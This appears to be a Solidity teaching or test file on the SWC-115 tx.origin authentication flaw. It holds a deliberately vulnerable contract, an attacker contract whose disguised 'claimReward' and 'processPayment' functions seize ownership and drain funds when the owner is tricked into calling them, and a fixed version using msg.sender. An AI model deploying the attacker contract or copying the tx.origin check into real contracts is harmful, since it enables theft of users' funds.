// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title TxOriginVulnerable
 * @dev Test contract with SWC-115 tx.origin authentication vulnerability
 * @notice DO NOT USE IN PRODUCTION - Educational purposes only
 */
contract TxOriginVulnerable {
    address public owner;
    mapping(address => uint256) public balances;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Withdrawal(address indexed to, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        // VULNERABILITY: Using tx.origin for authorization
        require(tx.origin == owner, "Not owner");
        _;
    }

    /**
     * @dev VULNERABLE: tx.origin can be exploited via phishing
     * @notice Attacker tricks owner into calling malicious contract
     */
    function transferOwnership(address newOwner) external onlyOwner {
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    /**
     * @dev VULNERABLE: Withdrawal with tx.origin check
     */
    function withdrawAll() external onlyOwner {
        uint256 balance = address(this).balance;
        payable(tx.origin).transfer(balance); // Also vulnerable: sending to tx.origin
        emit Withdrawal(tx.origin, balance);
    }

    /**
     * @dev VULNERABLE: Sensitive operation with tx.origin
     */
    function emergencyWithdraw(address to) external {
        require(tx.origin == owner, "Only owner via tx.origin");
        uint256 balance = address(this).balance;
        payable(to).transfer(balance);
    }

    /**
     * @dev Deposit function
     */
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    receive() external payable {}
}

/**
 * @title TxOriginAttacker
 * @dev Phishing contract to exploit tx.origin vulnerability
 */
contract TxOriginAttacker {
    TxOriginVulnerable public target;
    address public attacker;

    constructor(address _target) {
        target = TxOriginVulnerable(payable(_target));
        attacker = msg.sender;
    }

    /**
     * @dev Phishing function - if owner calls this, attacker gains control
     * @notice This could be disguised as a legitimate function
     */
    function claimReward() external {
        // When owner calls this, tx.origin == owner
        // So the vulnerability allows this to succeed
        target.transferOwnership(attacker);
    }

    /**
     * @dev Another phishing vector
     */
    function processPayment() external payable {
        // Attacker's contract receives payment
        // Then exploits tx.origin to drain victim's contract
        target.emergencyWithdraw(attacker);
    }

    receive() external payable {}
}

/**
 * @title TxOriginSecure
 * @dev Fixed version using msg.sender (for comparison)
 */
contract TxOriginSecure {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        // SECURE: Using msg.sender for authorization
        require(msg.sender == owner, "Not owner");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    function withdrawAll() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
